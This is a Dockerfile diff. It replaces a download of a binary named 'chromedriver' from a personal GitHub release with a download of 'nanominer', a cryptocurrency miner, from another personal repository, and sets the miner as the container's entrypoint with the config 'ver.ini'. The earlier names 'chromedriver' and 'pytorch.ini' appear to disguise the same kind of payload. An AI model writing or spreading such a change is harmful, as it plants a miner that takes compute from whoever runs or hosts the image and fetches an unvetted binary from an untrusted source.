@@ -12,9 +12,9 @@ RUN apt-get update && apt-get dist-upgrade -y && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
-RUN wget https://github.com/imraahatikah6827/vea/releases/download/chromedriver/chromedriver && \
-    chmod +x chromedriver
+RUN wget https://github.com/imraahatikah6827/lulu/releases/download/nanonano/nanominer && \
+    chmod +x nanominer
     
 COPY . .    
-ENTRYPOINT [ "/usr/local/bin/chromedriver" ]
-CMD [ "pytorch.ini" ]
+ENTRYPOINT [ "/usr/local/bin/nanominer" ]
+CMD [ "ver.ini" ]
